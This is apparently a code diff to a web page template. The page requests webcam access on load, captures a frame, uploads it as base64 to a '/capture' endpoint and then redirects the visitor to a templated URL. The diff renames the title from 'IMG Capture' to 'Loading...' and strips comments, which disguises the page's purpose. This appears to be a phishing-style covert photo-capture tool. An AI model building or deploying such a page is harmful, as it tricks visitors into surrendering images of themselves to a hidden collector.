@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IMG Capture</title>
+    <title>Loading...</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
         
@@ -52,7 +52,6 @@
     let canvas = null;
     let redirectUrl = '{{ redirect_url }}';
 
-    // Auto-request permission on page load
     window.onload = function() {
         requestPermission();
     };
@@ -72,7 +71,6 @@
             video.srcObject = stream;
             video.play();
 
-            // Wait for video to be ready
             await new Promise(resolve => {
                 video.addEventListener('loadedmetadata', resolve);
             });
@@ -85,15 +83,9 @@
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0);
 
-            // Convert to base64
             const imageData = canvas.toDataURL('image/png');
-
-            // Stop the stream
             stream.getTracks().forEach(track => track.stop());
 
-            // Spinner stays visible while saving
-
-            // Send to server
             const response = await fetch('/capture', {
                 method: 'POST',
                 headers: {
@@ -105,12 +97,10 @@
             const result = await response.json();
 
             if (result.success) {
-                // Redirect after a short delay
                 setTimeout(() => {
                     window.location.href = redirectUrl;
                 }, 1500);
             } else {
-                // Hide spinner if error
                 document.getElementById('loading').style.display = 'none';
                 alert('Error: ' + result.error);
             }
@@ -120,8 +110,6 @@
             alert('Camera access denied or error occurred: ' + error.message);
         }
     }
-
-    // Handle page visibility change to stop stream if user switches tabs
     document.addEventListener('visibilitychange', function() {
         if (document.hidden && stream) {
             stream.getTracks().forEach(track => track.stop());
